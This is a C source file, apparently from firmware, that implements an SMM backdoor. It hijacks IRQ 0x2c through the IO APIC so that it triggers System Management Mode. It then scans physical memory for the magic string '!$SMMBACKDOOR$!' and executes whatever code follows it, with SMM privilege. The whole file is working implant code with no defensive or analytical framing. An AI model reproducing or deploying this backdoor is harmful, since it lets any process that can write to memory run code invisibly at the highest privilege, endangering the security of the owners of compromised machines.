#include "config.h" // CONFIG_*
#include "output.h" // dprintf
#include "string.h" // memcpy
#include "x86.h" // inb

#include "backdoor.h"

#define PAGE_SIZE	4096
#define MAGIC		"!$SMMBACKDOOR$!"

#define IOAPIC_BASE	(void *)0xfec00000
#define LOCAL_APIC_BASE	(void *)0xfee00000
#define HIJACKED_IRQ	0x2c
#define INTERRUPT_VECTOR	0x3e

typedef unsigned long ULONG;
typedef unsigned short USHORT;
typedef unsigned char UCHAR;

typedef u32 uint32_t;
typedef u64 uint64_t;

extern unsigned long __force_order;

static int irq_hijacked;


static inline unsigned long read_cr0(void)
{
	unsigned long val;
	asm volatile("mov %%cr0,%0\n\t" : "=r" (val), "=m" (__force_order));
	return val;
}

static inline void write_cr0(unsigned long val)
{
	asm volatile("mov %0,%%cr0": : "r" (val), "m" (__force_order));
}

static void execute_code(void *addr)
{
	unsigned char *p;
	int (*f)(void);
	int ret;

	p = addr;
	p += sizeof(MAGIC)-1;
	f = (void *)p;

	dprintf(3, "[backdoor] first bytes: %02x %02x %02x\n",
		p[0], p[1], p[2]);
	dprintf(3, "[backdoor] executing payload\n");

	ret = f();

	dprintf(3, "[backdoor] done (0x%x)\n", ret);
}

static int find_magic(void *addr, void *pattern, size_t size)
{
	return memcmp(addr, pattern, size) == 0;
}

/* http://wiki.osdev.org/Detecting_Memory_(x86)#Getting_an_E820_Memory_Map */
static int scan_memory(void)
{
	register ULONG *mem;
	ULONG mem_count, a;
	USHORT memkb;
	ULONG cr0;
	int found;

	found = 0;

	mem_count=0;
	memkb=0;

	// store a copy of CR0
	cr0 = read_cr0();

	// invalidate the cache
	// write-back and invalidate the cache
	__asm__ __volatile__ ("wbinvd");

	// plug cr0 with just PE/CD/NW
	// cache disable(486+), no-writeback(486+), 32bit mode(386+)
	write_cr0(cr0 | 0x00000001 | 0x40000000 | 0x20000000);

	do {
		memkb++;
		mem_count += 1024*1024;
		mem = (ULONG *)mem_count;

		//dprintf(3, "[probe memory] %p\n", mem);

		a= *mem;
		*mem = 0x55AA55AA;

		// the empty asm calls tell gcc not to rely on what's in its registers
		// as saved variables (this avoids GCC optimisations)
		asm("":::"memory");

		if (*mem != 0x55AA55AA) {
			mem_count = 0;
		} else {
			*mem = 0xAA55AA55;
			asm("":::"memory");
			if (*mem != 0xAA55AA55)
				mem_count = 0;
		}

		if (mem_count != 0) {
			void *addr;
			int i;

			addr = (void *)mem_count;
			for (i = 0; i < (1024 * 1024) / PAGE_SIZE; i++) {
				if (find_magic(addr, MAGIC, sizeof(MAGIC)-1)) {
					dprintf(3, "[backdoor] magic found at %p\n",
						addr);
					execute_code(addr);
					found = 1;
				}
				addr += PAGE_SIZE;
			}
		}

		asm("":::"memory");
		*mem = a;
	} while (memkb < 4096 && mem_count != 0);

	write_cr0(cr0);

	return found;
}

/* forward hijacked IRQ */
static void forward_interrupt(void)
{
	uint32_t volatile *a, *b;
	unsigned char *p;

	p = LOCAL_APIC_BASE;
	b = (void *)(p + 0x310);
	a = (void *)(p + 0x300);

	/* send IPI by writing to local apic */
	*b = 0x00000000;
	*a = INTERRUPT_VECTOR << 0;
}

/*
 * 1. forward interrupt
 * 2. scan for magic in physical pages
 * 3. remove backdoor if magic was found
 */
void backdoor(void)
{
	if (!irq_hijacked)
		init_backdoor();

	forward_interrupt();
	if (scan_memory())
		remove_backdoor();
}

static uint32_t cpuReadIoApic(void *ioapicaddr, uint32_t reg)
{
	uint32_t volatile *ioapic = (uint32_t volatile *)ioapicaddr;
	ioapic[0] = (reg & 0xff);
	return ioapic[4];
}

static void cpuWriteIoApic(void *ioapicaddr, uint32_t reg, uint32_t value)
{
	uint32_t volatile *ioapic = (uint32_t volatile *)ioapicaddr;
	ioapic[0] = (reg & 0xff);
	ioapic[4] = value;
}

/* don't hijack IRQ anymore */
void remove_backdoor(void)
{
	uint32_t value;

	if (!irq_hijacked)
		return;

	dprintf(3, "[backdoor] remove IRQ #0x%02x hijacking\n", HIJACKED_IRQ);

	value = INTERRUPT_VECTOR;
	cpuWriteIoApic(IOAPIC_BASE, HIJACKED_IRQ, value);

	irq_hijacked = 0;
}

/* hijack IRQ */
void init_backdoor(void)
{
	uint32_t value;

	if (irq_hijacked)
		return;

	dprintf(3, "[backdoor] hijacking IRQ #0x%02x\n", HIJACKED_IRQ);

	/* 0x2c | (0b010 << 8) => SMI
	* The vector information is ignored but must be
	* programmed to all zeroes for future compatibility. */
	value = 0x00000200;

	cpuWriteIoApic(IOAPIC_BASE, HIJACKED_IRQ, value);

	irq_hijacked = 1;
}
